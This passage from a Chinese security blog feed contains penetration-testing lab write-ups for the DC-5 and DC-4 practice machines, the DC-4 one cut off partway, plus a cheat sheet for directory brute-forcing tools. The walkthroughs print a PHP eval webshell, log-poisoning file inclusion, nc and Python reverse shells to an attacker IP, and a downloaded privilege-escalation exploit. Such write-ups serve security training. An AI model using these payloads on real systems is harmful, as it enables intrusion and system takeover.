alt="image-20240531200218727"></p><p>okok，这回是真下班了！</p><h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h1><ol><li>爆破真的是一项大工程，可能由于字典很大没法进行，所以爆破不出来可能只是字典的原因罢了</li><li>提权方法千千万，善于利用信息才好办，多找信息，多找方法，最终估计还得命令提权</li><li>后台系统找命令执行很重要，怎么拿到一个webshell确实很重要</li><li>可以通过别的用户权限的可执行文件去切换用户或者提权</li></ol>]]></content>
    
    
    <categories>
      
      <category>渗透学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web攻防</tag>
      
      <tag>打靶日记</tag>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>目录爆破工具集合</title>
    <link href="/2024/05/30/%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7%E9%9B%86%E5%90%88/"/>
    <url>/2024/05/30/%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7%E9%9B%86%E5%90%88/</url>
    
    <content type="html"><![CDATA[<h1 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u http://192.168.31.230/<br></code></pre></td></tr></table></figure><ul><li><p>常用命令参数</p><blockquote><p>-u               攻击目标url地址，可以指定多个，通过逗号分隔<br>-l                url列表文件，比如你可以建一个 targets.txt，里面包含需要攻击的网址<br>-e               站点文件类型列表，如：php,asp，有默认配置：php,aspx,jsp,html,js，基本主流的格式都包含了<br>-X               不需要扫描的站点文件类型列表<br>-w               用指定爆破字典执行，若存在多个通过逗号分隔<br>-t               指定线程数<br>-i               仅现实指定的状态码，指定多个通过逗号分隔<br>-x               不显示指定的状态码，指定多个通过逗号分隔<br>–exclude-sizes&#x3D;SIZES               不显示的响应包大小（Example: 123B,4KB）<br>–exclude-texts&#x3D;TEXTS               不显示的响应包关键字 (Example: “Not found”, “Error”）<br>-m               指定请求方式，默认GET</p></blockquote></li><li><p>输出报告格式</p><blockquote><p>–simple-report&#x3D;OUTPUTFILE               简洁报告<br>–plain-text-report&#x3D;OUTPUTFILE               纯文本格式报告<br>–json-report&#x3D;OUTPUTFILE               json格式报告<br>–xml-report&#x3D;OUTPUTFILE               xml格式报告<br>–markdown-report&#x3D;OUTPUTFILE               markdown格式报告</p></blockquote></li></ul><h1 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.31.230 --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><ul><li><p>全局参数</p><blockquote><p>–debug                                              打开debug模式(调试模式)<br>–delay duration          每个线程在请求之间等待的时间（举例：–delay 1500ms）<br>–no-color                                                      禁用颜色输出<br>–no-error                                                        不显示错误<br>-z，–no-progress                                                 不显示进度<br>-o，-output string                                             输出结果到文件<br>-p，–pattern string                                        包含替换模式的文件<br>-q，–quiet                                      不打印banner信息和其他无用信息<br>-t，–threads int                                        指定线程数量（默认10）<br>-v，–verbose                                    详细输出日志（错误信息也会展示）<br>-w，–wordlist string                   指定字典路径，指定-可以通过标准输入中读取</p></blockquote></li><li><p>模式</p><blockquote><p>dir         经典目录暴力破解模式<br>dns        DNS子域暴力破解模式<br>s3         枚举打开的 S3 存储桶并查找是否存在和存储桶列表<br>gcs        枚举打开的谷歌云存储桶<br>vhost     虚拟主机暴力破解模式（与DNS不同！）<br>fuzz        使用模糊测试模式。替换URL、Headers和请求体中的关键词FUZZ<br>tftp          暴力破解 tftp 文件</p></blockquote></li></ul><p>详细用法不在过多介绍,每个模式又对应了不同的参数用法</p><h1 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirb &lt;url_base&gt; [&lt;wordlist_file(s)&gt;] [options]<br>dirb http://192.168.31.230<br></code></pre></td></tr></table></figure><blockquote><p>-a 设置user-agent<br>-p &lt;proxy[:port]&gt;设置代理<br>-c 设置cookie<br>-z 添加毫秒延迟，避免洪水攻击<br>-o 输出结果<br>-X 在每个字典的后面添加一个后缀<br>-H 添加请求头<br>-i 不区分大小写搜索<br>-N 忽略不必要的状态码<br>-r 不递归搜索</p></blockquote><h1 id="feroxbuster"><a href="#feroxbuster" class="headerlink" title="feroxbuster"></a>feroxbuster</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">feroxbuster -u http://192.168.31.230/<br></code></pre></td></tr></table></figure><blockquote><p>-u &lt;URL&gt;: 指定要扫描的目标 URL。</p><p>-w &lt;wordlist&gt;: 指定要使用的字典文件。</p><p>-t &lt;threads&gt;: 设置并行线程数。</p><p>-x &lt;status codes&gt;: 指定要忽略的 HTTP 状态码（用逗号分隔）。</p><p>-r: 启用递归扫描。</p><p>-o &lt;file&gt;: 将扫描结果输出到文件。</p><p>-v: 启用详细输出模式。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>工具教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>使用教程</tag>
      
      <tag>web攻防</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dc-5打靶日记</title>
    <link href="/2024/05/30/dc-5%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/"/>
    <url>/2024/05/30/dc-5%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="1-nmap扫描"><a href="#1-nmap扫描" class="headerlink" title="1. nmap扫描"></a>1. nmap扫描</h1><h2 id="1-1-确认目标ip地址"><a href="#1-1-确认目标ip地址" class="headerlink" title="1.1 确认目标ip地址"></a>1.1 确认目标ip地址</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sN 192.168.31.0/24<br></code></pre></td></tr></table></figure><p>为打开靶机状态下C端扫描结果</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405261727582.png" alt="image-20240526172730481"></p><p>打开靶机后再进行一次存活IP扫描从而确定靶机的ip地址；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405261732404.png" alt="image-20240526173213358"></p><p>虽然不太清楚为什么ip：<code>192.168.31.112</code>多扫出那么多开放端口，但是多出来的ip地址确实是<code>192.168.31.102</code>，以及其mac地址的标识也充分证明了这个ip确实是我们的靶机</p><blockquote><p>目标ip地址：192.168.31.102</p></blockquote><h2 id="1-2-目标开放TCP端口"><a href="#1-2-目标开放TCP端口" class="headerlink" title="1.2 目标开放TCP端口"></a>1.2 目标开放TCP端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sT --min-rate 10000 -p- 192.168.31.102 -oA nmapscan/tcp-ports<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405261924144.png" alt="image-20240526192429092"></p><blockquote><p>开放端口为：80,111,49249</p></blockquote><h2 id="1-3-目标开放UDP端口"><a href="#1-3-目标开放UDP端口" class="headerlink" title="1.3 目标开放UDP端口"></a>1.3 目标开放UDP端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sU --top-ports 20 192.168.31.102 -oA nmapscan/udp-ports<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405261925906.png" alt="image-20240526192546865"></p><h2 id="1-4-开放TCP端口详细信息"><a href="#1-4-开放TCP端口详细信息" class="headerlink" title="1.4 开放TCP端口详细信息"></a>1.4 开放TCP端口详细信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sT -sV -sC -O -p80,111,49249 192.168.31.102 -oA nmapscan/tcpports-Details<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405261929334.png" alt="image-20240526192949296"></p><blockquote><p>111端口不太熟悉，可以先不看，先看看80端口有什么突破口吗，49249不知道是啥端口，入手点比较少，考虑从80端口拿点信息先</p><p>111端口：rpcbind</p><p>80端口：http</p><p>49249端口：不知道开得啥</p></blockquote><h2 id="1-5-nmap漏洞扫描"><a href="#1-5-nmap漏洞扫描" class="headerlink" title="1.5 nmap漏洞扫描"></a>1.5 nmap漏洞扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -script=vuln -p80,111,49249 192.168.31.102 -oA nmapscan/vuln<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405261934375.png" alt="image-20240526193406343"></p><blockquote><p>可以看到的是似乎存在csrf，但是其实并没有什么用就是啦；</p></blockquote><h1 id="2-信息检索"><a href="#2-信息检索" class="headerlink" title="2. 信息检索"></a>2. 信息检索</h1><h2 id="2-1-网页访问80端口"><a href="#2-1-网页访问80端口" class="headerlink" title="2.1 网页访问80端口"></a>2.1 网页访问80端口</h2><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405261944791.png" alt="image-20240526194414722"></p><blockquote><p>好吧，获得的信息就是没获得信息，目录爆破一下吧；唯一信息</p><p>nginx：1.6.2</p></blockquote><h2 id="2-2-gobuster目录爆破"><a href="#2-2-gobuster目录爆破" class="headerlink" title="2.2 gobuster目录爆破"></a>2.2 gobuster目录爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.31.102 --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405261948809.png" alt="image-20240526194829762"></p><blockquote><p>ok，又啥也没有；不知道是不是字典的问题，换个工具爆破试试</p></blockquote><p>使用<code>dirseacher</code>扫一下看看，有没有什么新目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u http://192.168.31.102<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405292103788.png" alt="image-20240529210339642"></p><blockquote><p>现在我们能够得到的目录信息有：</p><p>&#x2F;contact.php</p><p>&#x2F;faq.php</p><p>&#x2F;footer.php</p><p>&#x2F;css</p><p>&#x2F;images&#x2F;</p><p>&#x2F;thankyou.php</p></blockquote><h2 id="2-3-获取网页信息"><a href="#2-3-获取网页信息" class="headerlink" title="2.3 获取网页信息"></a>2.3 获取网页信息</h2><p>对上述我们进行目录爆破的网址进行逐一访问，观察其信息特点，发现其中几个目录分别对应了首页的几个控件：</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405292109339.png" alt="image-20240529210933282"></p><p>但是在访问<code>footer.php</code>时发现只有一个版权信息，似乎是页脚的意思</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405292110948.png" alt="image-20240529211007914"></p><p>然后对<code>thankyou.php</code>访问时，发现该网页包含了该<code>footer.php</code>文件，可以考虑文件包含进行测试</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405292111387.png" alt="image-20240529211125345"></p><p>尝试文件包含，访问网址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.31.102/thankyou.php?file=/etc/passwd<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405292113811.png" alt="image-20240529211319768"></p><p>发现确实存在文件包含，使用<code>burpsuite</code>抓包分析一下。</p><h1 id="3-getshell"><a href="#3-getshell" class="headerlink" title="3. getshell"></a>3. getshell</h1><p>由于nginx会将执行的命令记录下来并写入日志文件中，所以先读取一下nignx的配置信息，查看日志文件的位置</p><blockquote><p>#nginx配置文件路径 &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405292121216.png" alt="image-20240529212129146"></p><blockquote><p>#nginx日志文件路径</p><p>错误执行记录：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p><p>执行记录：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405292123546.png" alt="image-20240529212318470"></p><p>尝试查看<code>error.log</code>文件，确实查看到了刚才我们无法执行的文件，那么我们可以通过写入php一句话木马进行连接，然后尝试获取连接；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405292127029.png" alt="image-20240529212748956"></p><p>发现确实存在我们写入的一句话木马，尝试使用蚁剑进行连接；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405292129328.png" alt="image-20240529212934291"></p><blockquote><p>ok，成功连接，文件包含确实存在，尝试将shell反弹到攻击机的终端</p><p>方法一：通过传入的一句话木马进行命令执行反弹shell；（上述传入的是post的一句话木马，故不太好进行命令执行，可以在传一个get方式传输的一句话木马，额，我没成功，不知道为啥）</p><p>方法二：直接通过蚁剑的虚拟终端执行nc -e &#x2F;bin&#x2F;bash &lt;攻击者IP&gt; &lt;监听端口&gt;即可；（这个成功了）</p></blockquote><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://192.168.31.102/thankyou.php?file=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">http://192.168.31.102/thankyou.php?file=/var/log/nginx/error.log&amp;shell=nc -e /bin/sh 192.168.31.221 5555</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405292148447.png" alt="image-20240529214825413"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405292148195.png" alt="image-20240529214858146"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405292149898.png" alt="image-20240529214915864"></p><p>成功连接，没关系，目的一致，达成就行，然后通过python指令开启一个互动式终端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p>成功拿到一个用户级的shell，接下来考虑提权吧。</p><h1 id="4-提权"><a href="#4-提权" class="headerlink" title="4. 提权"></a>4. 提权</h1><h2 id="4-1-命令提权"><a href="#4-1-命令提权" class="headerlink" title="4.1 命令提权"></a>4.1 命令提权</h2><p>尝试找找看是否存在可以利用的命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405301457738.png" alt="image-20240530145712633"></p><blockquote><p>可以尝试用来提权的命令有：mount、screen-4.5.0、exim4</p></blockquote><p>先来尝试一下<code>exim4</code>吧，查看一下命令的版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exim --version<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405301459978.png" alt="image-20240530145953928"></p><blockquote><p>版本4.84_2，查看是否存在可利用的漏洞</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405301501594.png" alt="image-20240530150120533"></p><p>确实存在该版本的漏洞但是是<code>_3</code>的不是<code>_2</code>的，所以其并不可利用，放弃；</p><p>试试其他命令<code>screen-4.5.0</code>，已经标注版本，查看是否存在相应的漏洞</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> screen <span class="hljs-number">4</span>.<span class="hljs-number">5</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405301503879.png" alt="image-20240530150313842"></p><blockquote><p>一个POC，一个利用脚本</p></blockquote><p>将利用脚本复制到当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -m 41154.sh<br></code></pre></td></tr></table></figure><p>与dc-4一致，先启动web机的apache2服务，将利用脚本上传web，然后使用目标机下载该脚本执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">service apache2 start<br><span class="hljs-built_in">cp</span> 41154.sh /var/www/html/<br></code></pre></td></tr></table></figure><p>然后来到目标机通过wget命令下载相应的提权脚本文件，由于目录权限的原因，一般到<code>/tmp</code>目录下执行脚本下载，然后给相应的脚本赋予可执行权限，再执行脚本</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> <span class="hljs-string">/tmp</span><br>wget http:<span class="hljs-string">//192.168.31.221/41154.sh</span><br>chmod +x 41154.sh<br><span class="hljs-string">./41154.sh</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405301518773.png" alt="image-20240530151821713"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405301518792.png" alt="image-20240530151838748"></p><blockquote><p>ok，成功拿到root权限，找到flag即可</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405301519504.png" alt="image-20240530151939434"></p><blockquote><p>这下是完美结束了，下班咯！</p></blockquote><h1 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h1><ol><li>基础漏洞得会才行，不然都不知道从哪里获得webshell，还谈什么提权</li><li>命令提权有很有中方式不一定是直接通过命令执行，有时候也是通过命令本身的漏洞执行</li><li>目录爆破跟字典有关系，有些时候没爆破出东西，可能是字典不够大，换个工具或者换个字典都行</li></ol>]]></content>
    
    
    <categories>
      
      <category>渗透学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web攻防</tag>
      
      <tag>打靶日记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dc-4打靶日记</title>
    <link href="/2024/05/25/dc-4%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/"/>
    <url>/2024/05/25/dc-4%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="1-nmap扫描"><a href="#1-nmap扫描" class="headerlink" title="1. nmap扫描"></a>1. nmap扫描</h1><h2 id="1-1-确定目标ip地址"><a href="#1-1-确定目标ip地址" class="headerlink" title="1.1 确定目标ip地址"></a>1.1 确定目标ip地址</h2><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405240914065.png" alt="image-20240524091400301"></p><p>通过比对未打开靶机时候的ip地址可以确定目标的ip地址，也可以通过MAC address识别出来的机器名称（VMware）进行确定</p><blockquote><p>目标ip地址：192.168.31.224</p></blockquote><h2 id="1-2-扫描目标开放的tcp端口"><a href="#1-2-扫描目标开放的tcp端口" class="headerlink" title="1.2 扫描目标开放的tcp端口"></a>1.2 扫描目标开放的tcp端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT --min-rate 10000 -p- 192.168.31.224 -oA nmapscan/tcpports<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405240918571.png" alt="image-20240524091831544"></p><p>确定目标开放的两个个tcp端口为：</p><blockquote><p>22,80</p></blockquote><h2 id="1-3-扫描目标开放的udp端口"><a href="#1-3-扫描目标开放的udp端口" class="headerlink" title="1.3 扫描目标开放的udp端口"></a>1.3 扫描目标开放的udp端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sU --min-rate 10000 -top-ports 20 192.168.31.224 -oA nmapscan/udpports<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405240918985.png" alt="image-20240524091818944"></p><p>虽然确实有蛮多开放的udp端口，但是不到万不得已我们一般不对udp端口进行测试，优先级排后。</p><h2 id="1-4-扫描开放tcp端口的详细信息"><a href="#1-4-扫描开放tcp端口的详细信息" class="headerlink" title="1.4 扫描开放tcp端口的详细信息"></a>1.4 扫描开放tcp端口的详细信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p22,80 192.168.31.224 -oA nmapscan/tcpports_Details<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405240921470.png" alt="image-20240524092130430"></p><p>可获得的信息：</p><blockquote><p>端口22：</p><p>​OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</p><p>端口80：  </p><p>​nginx 1.15.10</p><p>​Linux 3.2 - 4.9</p><p>​OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</p></blockquote><h2 id="1-5-nmap漏洞扫描"><a href="#1-5-nmap漏洞扫描" class="headerlink" title="1.5 nmap漏洞扫描"></a>1.5 nmap漏洞扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p22,80 192.168.31.224 -oA nmapscan/vulnscan<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405240928003.png" alt="image-20240524092815962"></p><p>可以得到的信息：</p><blockquote><p>可能存在CSRF漏洞：</p><p>​<a href="http://192.168.31.224/login.php">http://192.168.31.224:80/login.php</a></p></blockquote><h1 id="2-网页检索"><a href="#2-网页检索" class="headerlink" title="2. 网页检索"></a>2. 网页检索</h1><h2 id="2-1-浏览网页"><a href="#2-1-浏览网页" class="headerlink" title="2.1 浏览网页"></a>2.1 浏览网页</h2><p>访问网页<code>192.168.31.224:80</code>就只有一个网页登录窗口</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405240926647.png" alt="image-20240524092637615"></p><p>可以考虑尝试sql注入但不限于，稍后再做尝试，看看目录爆破能不能破出什么东西出来</p><h2 id="2-2-gubuster目录爆破"><a href="#2-2-gubuster目录爆破" class="headerlink" title="2.2 gubuster目录爆破"></a>2.2 gubuster目录爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u 192.168.31.224 --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405240934796.png" alt="image-20240524093457755"></p><p>好吧，基本上没扫到什么东西。</p><h2 id="2-3-尝试访问存在CSRF的网页"><a href="#2-3-尝试访问存在CSRF的网页" class="headerlink" title="2.3 尝试访问存在CSRF的网页"></a>2.3 尝试访问存在CSRF的网页</h2><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405240935557.png" alt="image-20240524093530526"></p><p>发现其实就是一开始的系统登录界面，还是没啥头绪，现在唯一的头绪就是哪个CSRF漏洞，尝试一下，抓个包看看账号密码传输的方式；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405240937041.png" alt="image-20240524093723003"></p><p>ok，信息get</p><blockquote><p>账号密码传输方式为<code>post</code>；传输格式：<code>username=123&amp;password=456</code></p></blockquote><p>查了一下CSRF发现用不了，算了，爆破用户名密码看看吧</p><h2 id="2-4-burpsuite爆破"><a href="#2-4-burpsuite爆破" class="headerlink" title="2.4 burpsuite爆破"></a>2.4 burpsuite爆破</h2><p>抓包进行账户名密码的爆破，仅设置<code>username</code>和<code>password</code>两个payload集合，并通过用户名字典和密码字典进行爆破。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405241048813.png" alt="image-20240524104858752"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405241050163.png" alt="image-20240524105001130"></p><p>仅筛选成功登录的用户名和密码，可得能够登录的用户名和密码并不止一个(但是其实并不是，后面我发现了，并不是能够登录的用户名和密码有多个，而是只有一个，当一次登录成功后，在同一个浏览器，无论写入什么账户名和密码都能够登录)</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405241050952.png" alt="image-20240524105051911"></p><blockquote><p>最后尝试后得知，真正的用户名和密码是：</p><p>username: adminpassword: happy</p></blockquote><h1 id="3-getshell"><a href="#3-getshell" class="headerlink" title="3. getshell"></a>3. getshell</h1><h2 id="3-1-系统探寻"><a href="#3-1-系统探寻" class="headerlink" title="3.1 系统探寻"></a>3.1 系统探寻</h2><p>进入系统后，选择<code>List Files</code>然后点击<code>Run</code>后得到以下界面，给出了一段文字，似乎好像是指我们执行了<code>ls -l</code>指令</p><blockquote><p>You have selected: ls -l</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405241102589.png" alt="image-20240524110211556"></p><p>尝试抓包看看是否能够更改这个指令，观察命令的传输方式；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405241106171.png" alt="image-20240524110606132"></p><p>根据抓包结果似乎是通过post方式发送的命令，简单尝试以下，因为刚才发送的是<code>ls+-l</code>可以得出一些文件，那么我们将其修改为<code>cat+index.php</code>看看是否能够得到相应的文本</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405241108957.png" alt="image-20240524110800920"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405241108952.png" alt="image-20240524110816889"></p><p>确实得到了相应的<code>index.php</code>文件的内容，那么我们就可以通过命令执行来反弹shell</p><h2 id="3-2-反弹shell"><a href="#3-2-反弹shell" class="headerlink" title="3.2 反弹shell"></a>3.2 反弹shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.221&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405241125142.png" 